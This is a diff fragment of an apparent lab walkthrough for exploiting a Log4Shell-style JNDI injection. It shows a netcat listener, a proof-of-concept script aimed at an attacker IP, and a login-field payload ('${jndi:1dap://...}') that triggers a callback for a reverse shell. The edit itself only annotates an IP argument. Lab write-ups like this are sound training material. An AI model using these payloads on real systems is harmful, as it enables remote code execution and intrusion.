@@ -277,7 +277,7 @@ Netcat will perform the banner grabbing and gather information such as content t
 	- in line **87** and replace  ``jdk1.8.0_20/bin/java`` with ``/usr/bin/jdk1.8.0_202/bin/java``
 	-  line **99** and replace ``jdk1.8.0_20/bin/java`` with ``/usr/bin/jdk1.8.0_202/bin/java``
 8. type  ``nc -lvp 9001``
-	- ``python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001``
+	- ``python3 poc.py --userip 10.10.1.13 (localip) --webport 8000 --lport 9001``
 	- login as user: ``${jndi:1dap://10.10.1.13:1389/a}`` and ``Password``
 	- check netcat lis
 - done 
